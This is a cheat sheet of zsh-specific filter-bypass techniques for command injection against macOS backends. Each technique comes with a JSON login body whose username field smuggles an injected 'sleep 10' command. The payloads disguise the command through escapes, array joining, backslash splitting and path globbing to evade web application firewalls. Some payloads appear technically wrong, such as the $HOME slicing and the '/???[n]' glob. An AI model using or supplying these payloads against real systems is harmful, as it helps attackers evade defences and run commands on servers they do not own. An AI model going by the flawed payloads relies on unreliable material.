## macOS (zsh) Bypass Techniques
Mac backend environments typically use zsh as the default system shell. While it shares structural features with Linux bash, zsh possesses modern, specialized array expansion operators and unique parameter modification features that allow for completely distinct firewall bypass methods.
## 1. Hexadecimal and Alternative Byte Injection
If alphabetic strings are blocked by the firewall, you can trigger native zsh built-in byte parsers. Unlike bash, zsh handles octal and hexadecimal escapes natively inside standard variable expansions without calling external utilities like printf or xxd.

* Native zsh Octal Expansion: Translates numeric bytes directly into execution objects.

{"password":"9012","username":"652223518;$'\163\154\145\145\160' 10;","rememberMe":false}

* Native zsh Hexadecimal Expansion: Avoids character filters using standard hex escaping.

{"password":"9012","username":"652223518;$'\x73\x6c\x65\x65\x70' 10;","rememberMe":false}


## 2. Advanced Environment Parameter Arithmetic & Array Slicing
The zsh engine indexes arrays starting at 1 (unlike Bash, which starts at 0). It also features flag structures like (j::) that pull strings together out of fragmented environment states.

* Zsh Global Parameter Extraction: Extracts characters out of ambient macOS settings to spell protected keywords.

{"password":"9012","username":"652223518;${HOME[1]}l${HOME[1]}ep 10;","rememberMe":false}

* Array Joining Flag Matrix: Joins distinct variables together without using space blocks or standard string operators.

{"password":"9012","username":"652223518;a=(sl ee p);${(j::)a} 10;","rememberMe":false}


## 3. WAF Keyword & Escape Character Insertion
The backslash character (\) can split words up inside a zsh environment to completely disrupt pattern matching.

* Backslash Word Splitting: Breaks static signatures scanning incoming inputs for execution binaries.

{"password":"9012","username":"652223518;s\l\e\e\p 10;","rememberMe":false}


## 4. Anonymous Wildcard Globbing
The macOS file system structure houses its internal BSD core utilities inside /bin/ or /usr/bin/. You can address these paths via regular expression masks.

* Implicit Directory Path Resolution: Maps out execution files without matching clear text rules.

{"password":"9012","username":"652223518;/???[n]/s???[p] 10;","rememberMe":false}


